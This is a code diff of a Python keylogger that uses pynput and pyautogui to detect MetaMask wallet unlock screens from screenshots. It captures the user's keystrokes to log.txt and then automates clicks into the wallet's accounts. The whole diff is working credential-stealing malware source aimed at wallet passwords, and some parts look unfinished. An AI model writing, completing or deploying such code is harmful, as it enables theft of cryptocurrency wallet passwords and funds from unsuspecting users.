@@ -5,56 +5,39 @@ from asyncore import write
 import pynput
 from pynput.keyboard import Key, Listener
 
+
+
 keys = []
+key = ""
+def on_press(key):
+    global keys
+    keys.append(key)
+    print("{0} pressed".format(key))
+    
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            f.write(k)
+        return False
 
-
+def on_release(key):
+    if(pyautogui.locateOnScreen('./img/unlock6.png')):
+        print("Stop")
+        return False
+    if key == Key.esc:
+        return False
+    
 while True:
     if(pyautogui.locateOnScreen('./img/unlock1.png')):
         print('Open MetaMask')
-        def on_press(key):
-            global keys
-            if(pyautogui.locateOnScreen('./img/unlock2.png')):
-                print("Stop")
-                write_file(keys)
-                keys = []
-            keys.append(key)
-            print("{0} pressed".format(key))
-            
-        def no_click(x,y,button,pressed):
-            print('{0} at {1}'.format('Pressed' if pressed else 'Released',(x,y)))
-            if not pressed:
-                return False
-
-        def write_file(keys):
-            with open("log.txt", "a") as f:
-                for key in keys:
-                    k = str(key).replace("'","")
-                    f.write(k)
-    
-        def on_release(key):
-            #time.sleep(5)
-            if(pyautogui.locateOnScreen('./img/unlock6.png')):
-                return False
-        
         with Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
-        with mouse.Listener(
-            on_move=on_move,
-            on_click=on_click,
-            on_scroll=on_scroll) as listener:
-            listener.join()
-        listener = mouse.Listener(
-            on_move=on_move,
-            on_click=on_click,
-            on_scroll=on_scroll)
-        listener.start()
-        
-        
         if(pyautogui.locateOnScreen('./img/unlock6.png')):
+            write_file(keys)
             print('Login MetaMask')
-            listener.stop()
             time.sleep(2)
-            pyautogui.click(1684,137)
+            pyautogui.click(1651,132)
             if(pyautogui.locateOnScreen('./img/unlock3.png')):
                 print('My Accounts')
                 time.sleep(1)
